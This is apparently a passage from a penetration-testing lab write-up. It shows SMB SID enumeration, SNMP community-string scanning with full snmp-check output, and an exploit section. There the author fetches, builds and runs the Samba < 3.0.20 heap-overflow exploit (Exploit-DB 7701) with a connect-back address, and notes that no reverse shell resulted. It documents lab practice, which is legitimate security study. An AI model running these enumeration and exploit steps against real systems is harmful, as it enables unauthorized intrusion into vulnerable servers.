S-1-5-21-1974239401-1762029558-4115558683-1030 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1031 0XBABE\kmem (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1032 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1033 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1034 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1035 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1036 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1037 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1038 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1039 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1040 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1041 0XBABE\dialout (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1042 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1043 0XBABE\fax (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1044 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1045 0XBABE\voice (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1046 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1047 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1048 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1049 0XBABE\cdrom (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1050 *unknown*\*unknown* (8)

 =============================================== 
|    Getting printer info for 192.168.233.42    |
 =============================================== 
No printers returned.


enum4linux complete on Thu Jan 13 07:13:16 2022

                                                  
```


## UDP 161 SNMP
```
┌──(kali㉿kali)-[~]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 192.168.162.42 -w 100                                           1 ⨯
Scanning 1 hosts, 121 communities
192.168.162.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
192.168.162.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
                                  
┌──(kali㉿kali)-[~]
└─$ snmp-check  192.168.162.42
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.162.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.162.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:35:43.38
  Uptime system                 : 00:35:02.77
  System date                   : 2022-1-29 01:10:16.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 69234
  TCP segments sent             : 69155
  TCP segments retrans          : 0
  Input datagrams               : 69735
  Delivered datagrams           : 69735
  Output datagrams              : 69519

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:ba:bd:dc
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 4625368
  Out octets                    : 4204446

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:bd:dc
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.162.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.162.254       0.0.0.0               1                   
  192.168.162.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  192.168.162.42        137                 
  192.168.162.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3774                  running               syslogd               /sbin/syslogd                             
  3777                  runnable              klogd                 /sbin/klogd                               
  3781                  runnable              clamd                 /usr/local/sbin/clamd                      
  3783                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3792                  runnable              inetd                 /usr/sbin/inetd                           
  3796                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3798                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3802                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3804                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3809                  runnable              sshd                  /usr/sbin/sshd                            
  3899                  runnable              atd                   /usr/sbin/atd                             
  3902                  runnable              cron                  /usr/sbin/cron                            
  3909                  runnable              apache                /usr/sbin/apache                          
  3915                  runnable              getty                 /sbin/getty           38400 tty1          
  3916                  runnable              getty                 /sbin/getty           38400 tty2          
  3917                  runnable              getty                 /sbin/getty           38400 tty3          
  3918                  runnable              getty                 /sbin/getty           38400 tty4          
  3919                  runnable              getty                 /sbin/getty           38400 tty5          
  3920                  runnable              getty                 /sbin/getty           38400 tty6          
  3921                  runnable              apache                /usr/sbin/apache                          
  3972                  runnable              apache                /usr/sbin/apache                          
  3973                  runnable              apache                /usr/sbin/apache                          
  3974                  runnable              apache                /usr/sbin/apache                          
  3975                  runnable              apache                /usr/sbin/apache                          
  3976                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
  3978                  runnable              apache                /usr/sbin/apache                          

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x000055bb4e5fb6d0 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055bb4e5f9b28 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 115.71 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x000055bb4e5f8ea8 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055bb4e5f2eb8 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x000055bb4e5edda0 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055bb4e5ec1d0 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 765.73 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x000055bb4e5e3260 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055bb4e5e1640 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr               
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```


# Exploits

https://github.com/macha97/exploit-smb-3.0.20


```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 7701                                                                                                                                            1 ⚙
  Exploit: Samba < 3.0.20 - Remote Heap Overflow
      URL: https://www.exploit-db.com/exploits/7701
     Path: /usr/share/exploitdb/exploits/linux/remote/7701.txt
File Type: C source, UTF-8 Unicode text

Copied to: /tmp/7701.txt


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat 7701.txt                                                                                                                                                    1 ⚙
/***********************************************************************************/
/* Samba < 3.0.20 heap overflow                                                    */
/* per Debian 3.0.14a Debian e altre versioni                                      */
/* per versionare il sorgente:                                                     */
/* usare l'opzione DEBUG                                                           */
/* usare free() dalla GOT (non funziona su Mandriva,RHEL e Fedora)                 */
/* da qualche parte nel 3Â°/4Â° pacchetto di risposta dice la versione di Samba    */
/* coded by zuc@hack.it                                                    */
/***********************************************************************************/
#define VERSN 25
struct versions vers[VERSN] =
{
{"Debian 3.1 r0 X restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 X",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a X 1st",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r1 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r1 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r2 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r2 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r3 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r3 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r4 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r4 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r5 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r5 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r6a noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r6a noX",0x0827c000,0x0837f000,30*1024},
{"Slackware 10.0 restart",0x0827c000,0x0837f000,30*1024},
{"Slackware 10.0",0x0827c000,0x0837f000,30*1024},
{"Mandrake 10.1 noX",0x80380000,0x8045b000,30*1024},
{"Mandrake 10.1 X Kde",0x80380000,0x8045b000,30*1024},
{"Samba 3.0.x DEBUG",0x80380000,0x8045b000,30*1024}
};

https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip (2009-lsa.zip)

# milw0rm.com [2009-01-08]                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip                                                                1 ⚙
--2022-01-28 19:55:19--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/7701.zip [following]
--2022-01-28 19:55:19--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/7701.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8112 (7.9K) [application/zip]
Saving to: ‘7701.zip’

7701.zip                                  100%[=====================================================================================>]   7.92K  --.-KB/s    in 0s      

2022-01-28 19:55:19 (69.2 MB/s) - ‘7701.zip’ saved [8112/8112]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ file 7701.zip                                                                                                                                                   1 ⚙
7701.zip: Zip archive data, at least v2.0 to extract
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ dtrx 7701.                                                                                                                                                      1 ⚙
dtrx: ERROR: 7701.: No such file or directory
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ dtrx 7701.zip                                                                                                                                               1 ⨯ 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd 7701                                                                                                                                                         1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$ ls                                                                                                                                                              1 ⚙
build  frontend.c  functions.c  in_frontend.h  lsa.c
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$ ./build                                                                                                                                                         1 ⚙
frontend.c: In function ‘main’:
frontend.c:33:1: warning: implicit declaration of function ‘usage’ [-Wimplicit-function-declaration]
   33 | usage();
      | ^~~~~
frontend.c:34:1: warning: implicit declaration of function ‘LSA’ [-Wimplicit-function-declaration]
   34 | LSA(argv[1],argv[2],argv[3],atoi(argv[4]),ax);
      | ^~~
functions.c: In function ‘hextoint’:
functions.c:531:3: warning: implicit declaration of function ‘free’ [-Wimplicit-function-declaration]
  531 |   free(mstr);
      |   ^~~~
functions.c:4:1: note: include ‘<stdlib.h>’ or provide a declaration of ‘free’
    3 | #include "in_frontend.h"
  +++ |+#include <stdlib.h>
    4 | 
functions.c:531:3: warning: incompatible implicit declaration of built-in function ‘free’ [-Wbuiltin-declaration-mismatch]
  531 |   free(mstr);
      |   ^~~~
functions.c:531:3: note: include ‘<stdlib.h>’ or provide a declaration of ‘free’
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$ ls                                                                                                                                                              1 ⚙
build  frontend  frontend.c  functions.c  in_frontend.h  lsa.c
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$ ./frontend                                                                                                                                                      1 ⚙

Samba < 3.0.20 Zuc
by Zuc (zuc@hack.it)

Usage: <victim-host> <connectback-ip> <connectback port> <version>

Sample: LSA www.victim.com 80.81.82.83 31337 1

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$ ./frontend 192.168.162.42 192.168.49.162 443 1                                                                                                                  1 ⚙

Samba < 3.0.20 Zuc
by Zuc (zuc@hack.it)
OS: Debian 3.1 r0 X
count: 1
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/7701]
└─$
```

NO reverse shell created



# Others